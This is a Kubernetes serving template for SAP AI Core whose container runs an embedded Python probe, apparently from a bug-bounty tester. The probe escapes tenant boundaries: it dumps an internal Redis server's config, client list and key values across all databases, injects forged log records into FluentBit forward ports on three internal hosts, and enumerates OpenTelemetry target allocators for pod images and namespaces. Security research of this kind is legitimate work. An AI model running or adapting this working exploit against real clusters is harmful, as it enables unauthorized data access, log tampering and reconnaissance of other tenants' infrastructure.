apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v12
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v12"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v12"
    executables.ai.sap.com/name: "impact-probe-v12"
    executables.ai.sap.com/description: "FluentBit inject + OTel TA2 + Redis probe v12"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import socket, time, ssl, json, struct
            import urllib.request, urllib.error

            def report(k, v):
                print(f"[P12] {k}: {str(v)[:8000]}", flush=True)

            def http_get(url, headers=None, timeout=10):
                try:
                    req = urllib.request.Request(url, headers=headers or {})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode(errors="replace")[:3000]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, {}
                except Exception as e:
                    return f"ERR:{type(e).__name__}:{e}", 0, {}

            # ── MSGPACK HELPERS (correct uint32/uint64 support) ───────────────────
            def mp_str(s):
                b = s.encode("utf-8")
                n = len(b)
                if n <= 31:
                    return bytes([0xa0 | n]) + b
                elif n <= 0xffff:
                    return struct.pack(">BH", 0xda, n) + b
                else:
                    return struct.pack(">BI", 0xdb, n) + b

            def mp_uint(n):
                if n <= 0x7f:
                    return struct.pack("B", n)
                elif n <= 0xff:
                    return struct.pack(">BB", 0xcc, n)
                elif n <= 0xffff:
                    return struct.pack(">BH", 0xcd, n)
                elif n <= 0xffffffff:
                    return struct.pack(">BI", 0xce, n)
                else:
                    return struct.pack(">BQ", 0xcf, n)

            def mp_map(d):
                n = len(d)
                hdr = bytes([0x80 | n]) if n <= 15 else struct.pack(">BH", 0xde, n)
                body = b""
                for k, v in d.items():
                    body += mp_str(k) + mp_str(str(v))
                return hdr + body

            def mp_array(items):
                n = len(items)
                hdr = bytes([0x90 | n]) if n <= 15 else struct.pack(">BH", 0xdc, n)
                return hdr + b"".join(items)

            # ── REDIS CLIENT ──────────────────────────────────────────────────────
            class Redis:
                def __init__(self, host, port=6379, timeout=8):
                    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.s.settimeout(timeout)
                    self.s.connect((host, port))
                    self.buf = b""

                def _send(self, *args):
                    cmd = f"*{len(args)}\r\n"
                    for a in args:
                        a = str(a)
                        cmd += f"${len(a)}\r\n{a}\r\n"
                    self.s.sendall(cmd.encode())

                def _recv_line(self):
                    while b"\r\n" not in self.buf:
                        c = self.s.recv(65536)
                        if not c:
                            break
                        self.buf += c
                    line, _, self.buf = self.buf.partition(b"\r\n")
                    return line.decode(errors="replace")

                def _read(self):
                    line = self._recv_line()
                    if not line:
                        return None
                    t, data = line[0], line[1:]
                    if t == '+': return data
                    if t == '-': return f"ERR:{data}"
                    if t == ':': return int(data)
                    if t == '$':
                        n = int(data)
                        if n == -1: return None
                        out = b""
                        while len(out) < n + 2:
                            out += self.s.recv(n + 2 - len(out))
                        self.buf = out[n+2:] + self.buf
                        return out[:n].decode(errors="replace")
                    if t == '*':
                        c = int(data)
                        return None if c == -1 else [self._read() for _ in range(c)]
                    return line

                def cmd(self, *args):
                    self._send(*args)
                    return self._read()

                def close(self):
                    try: self.s.close()
                    except: pass

            # ── 1. REDIS AT 100.104.166.183:6379 ─────────────────────────────────
            report("---", "=== 1. REDIS 100.104.166.183:6379 ===")
            try:
                r = Redis("100.104.166.183", 6379, timeout=8)
                pong = r.cmd("PING")
                report("REDIS_PING", pong)

                # Try to read INFO regardless of auth
                info = r.cmd("INFO", "server")
                report("REDIS_INFO_SERVER", info)

                info_all = r.cmd("INFO", "all")
                report("REDIS_INFO_ALL", info_all)

                # CONFIG GET
                cfg = r.cmd("CONFIG", "GET", "*")
                report("REDIS_CONFIG", str(cfg)[:3000])

                # CLIENT LIST
                report("REDIS_CLIENT_LIST", r.cmd("CLIENT", "LIST"))

                # Keys across all DBs
                for db in range(16):
                    r.cmd("SELECT", db)
                    sz = r.cmd("DBSIZE")
                    if sz and isinstance(sz, int) and sz > 0:
                        report(f"REDIS_DB{db}_SIZE", sz)
                        r.cmd("SELECT", db)
                        keys = r.cmd("KEYS", "*")
                        report(f"REDIS_DB{db}_KEYS", keys)
                        if keys and isinstance(keys, list):
                            for key in keys[:30]:
                                try:
                                    ktype = r.cmd("TYPE", key)
                                    ttl = r.cmd("TTL", key)
                                    if ktype == "string":
                                        val = r.cmd("GET", key)
                                    elif ktype == "hash":
                                        val = r.cmd("HGETALL", key)
                                    elif ktype == "list":
                                        val = r.cmd("LRANGE", key, "0", "20")
                                    elif ktype == "set":
                                        val = r.cmd("SMEMBERS", key)
                                    else:
                                        val = "?"
                                    report(f"REDIS_DB{db}_KEY_{key}", f"[{ktype}] ttl={ttl} {str(val)[:600]}")
                                except Exception as ke:
                                    report(f"REDIS_DB{db}_KEY_{key}_ERR", str(ke))

                r.close()
            except ConnectionRefusedError as e:
                report("REDIS_ERR", f"ECONNREFUSED: {e}")
            except socket.timeout:
                report("REDIS_ERR", "ETIMEDOUT")
            except OSError as e:
                report("REDIS_ERR", f"OSError {e.errno}: {e}")
            except Exception as e:
                import traceback
                report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:800]}")

            # ── 2. FLUENTBIT FORWARD INPUT — FIXED MSGPACK ────────────────────────
            report("---", "=== 2. FLUENTBIT LOG INJECTION (port 24224) ===")

            def fluent_forward_msg(tag, record):
                ts = int(time.time())
                # Entry: [timestamp, record]
                entry = mp_array([mp_uint(ts), mp_map(record)])
                # Entries array: [[ts, record]]
                entries = mp_array([entry])
                # Full message: [tag, entries, options]
                msg = mp_array([mp_str(tag), entries, mp_map({})])
                return msg

            fb_targets = [
                "100.64.76.16",
                "100.64.33.11",
                "100.109.242.36",
            ]
            record = {
                "log":    "SAP AI Core security probe: unauthenticated log injection via FluentBit forward input port 24224 from KServe tenant pod",
                "tenant": "cf-aicore-security-bb-12",
                "pod":    "impact-probe-v12",
                "level":  "SECURITY_FINDING",
                "source": "rce_impact_probe",
            }
            for fb_host in fb_targets:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                try:
                    s.connect((fb_host, 24224))
                    report(f"FLUENTBIT_{fb_host}_TCP", "CONNECTED")
                    payload = fluent_forward_msg("security.probe.rce", record)
                    report(f"FLUENTBIT_{fb_host}_PAYLOAD_LEN", len(payload))
                    s.sendall(payload)
                    time.sleep(2)
                    s.settimeout(3)
                    try:
                        resp = s.recv(256)
                        report(f"FLUENTBIT_{fb_host}_RESPONSE", f"bytes={len(resp)} {resp[:100]!r}")
                    except socket.timeout:
                        report(f"FLUENTBIT_{fb_host}_RESPONSE", "no ACK (accepted silently — normal for forward mode)")
                    s.close()
                    report(f"FLUENTBIT_{fb_host}_RESULT", "INJECTION SENT")
                except ConnectionRefusedError:
                    report(f"FLUENTBIT_{fb_host}", "ECONNREFUSED")
                except OSError as e:
                    if e.errno == 104:
                        report(f"FLUENTBIT_{fb_host}", "ECONNRESET (Istio)")
                    else:
                        report(f"FLUENTBIT_{fb_host}", f"OSError {e.errno}: {e}")
                except Exception as e:
                    report(f"FLUENTBIT_{fb_host}_ERR", f"{type(e).__name__}: {e}")
                finally:
                    try: s.close()
                    except: pass

            # ── 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ─────────────
            report("---", "=== 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ===")
            TA2 = "http://100.106.186.136:80"

            body, code, _ = http_get(f"{TA2}/", timeout=8)
            report("TA2_ROOT", f"[{code}] {body[:500]}")

            # Jobs list
            body, code, _ = http_get(f"{TA2}/jobs", timeout=10)
            report("TA2_JOBS", f"[{code}] {body[:3000]}")

            # All job targets
            body, code, _ = http_get(f"{TA2}/debug/jobs", timeout=10)
            report("TA2_DEBUG_JOBS", f"[{code}] {body[:3000]}")

            # Scrape configs
            body, code, _ = http_get(f"{TA2}/debug/scrape_configs", timeout=10)
            report("TA2_SCRAPE_CONFIGS", f"[{code}] {body[:5000]}")

            # Targets
            body, code, _ = http_get(f"{TA2}/debug/targets", timeout=10)
            report("TA2_TARGETS", f"[{code}] {body[:3000]}")

            # Known job paths from other TA
            for job in ["kubernetes-pods", "kubernetes-nodes", "kubernetes-endpointslices",
                        "kubernetes-nodes-cadvisor", "kubernetes-service-endpoints"]:
                body, code, _ = http_get(f"{TA2}/jobs/{job}/targets", timeout=10)
                if code == 200:
                    report(f"TA2_JOB_{job}", body[:3000])
                else:
                    report(f"TA2_JOB_{job}", f"[{code}] {body[:200]}")

            # ── 4. COMPARE WITH KNOWN OTel TA ────────────────────────────────────
            report("---", "=== 4. KNOWN OTEL TA JOBS REFRESH ===")
            TA1 = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
            body, code, _ = http_get(f"{TA1}/jobs", timeout=10)
            report("TA1_JOBS", f"[{code}] {body[:2000]}")

            body, code, _ = http_get(f"{TA1}/jobs/kubernetes-pods/targets", timeout=12)
            if code == 200:
                # Extract pod IPs and images we haven't seen before
                import re
                images = re.findall(r'"__meta_kubernetes_pod_container_image":"([^"]+)"', body)
                namespaces = re.findall(r'"__meta_kubernetes_namespace":"([^"]+)"', body)
                unique_images = list(set(images))
                unique_ns = list(set(namespaces))
                report("TA1_POD_IMAGES", "\n".join(sorted(unique_images)[:60]))
                report("TA1_POD_NAMESPACES", "\n".join(sorted(unique_ns)[:40]))

            report("DONE", "probe v12 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
